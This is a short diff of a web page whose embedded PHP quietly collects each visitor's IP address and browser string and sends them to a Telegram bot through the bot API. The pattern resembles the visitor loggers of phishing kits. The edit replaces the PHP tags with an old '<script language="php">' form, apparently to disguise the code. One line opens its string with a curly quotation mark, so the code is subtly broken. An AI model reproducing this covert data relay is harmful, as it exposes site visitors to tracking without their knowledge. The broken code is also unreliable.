@@ -16,7 +16,7 @@
 <script src="ads/system/context.js" async=""></script>
 </head>
 <body>
-<?php
+<script language="php">
 //Get the visitor's IP
 $IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR']);
 $Browser = $_SERVER['HTTP_USER_AGENT'];
@@ -48,7 +48,7 @@ $data = [
    ]; 
 
 $response = file_get_contents(“http://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) ); 
-?>
+</script>
 
 <div class="container">
 <header>
